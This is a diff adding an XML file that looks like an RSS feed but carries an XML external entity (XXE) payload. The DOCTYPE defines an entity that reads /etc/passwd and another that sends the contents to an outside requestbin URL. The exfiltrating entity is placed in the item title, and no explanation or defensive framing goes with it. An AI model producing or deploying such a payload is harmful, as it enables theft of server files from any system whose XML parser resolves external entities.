@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY send SYSTEM "https://requestbin.net/r/9r83vig2?file=%file;">
+]]>
+
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+        <item>
+          <title>&send;</title>
+        </item>
+  </channel>
+</rss>
